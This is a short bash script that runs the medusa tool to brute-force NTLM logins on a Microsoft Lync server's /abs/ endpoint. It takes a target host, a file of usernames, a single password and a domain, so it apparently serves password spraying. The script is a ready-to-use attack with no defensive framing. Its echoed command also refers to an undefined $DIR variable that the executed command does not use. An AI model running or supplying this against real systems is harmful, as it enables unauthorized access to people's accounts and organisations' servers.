#!/bin/bash
HOST=$1
USERS=$2
PASSWORD=$3
DOMAIN=$4

if [ -z $HOST ]; then
	echo "Usage: ./brute_force_ntlm.sh <lync_host> <username_file> <password> <domain>"
	exit 1
fi

echo "Executing brute force attack"
echo ""
echo "Command:"
echo "medusa -h $HOST -U $DIR/$USERS -p '$PASSWORD' -M http -m AUTH:NTLM -m DIR:/abs/ -m DOMAIN:$DOMAIN -s"
medusa -h $HOST -U $USERS -p \'$PASSWORD\' -M http -m AUTH:NTLM -m DIR:/abs/ -m DOMAIN:$DOMAIN -s
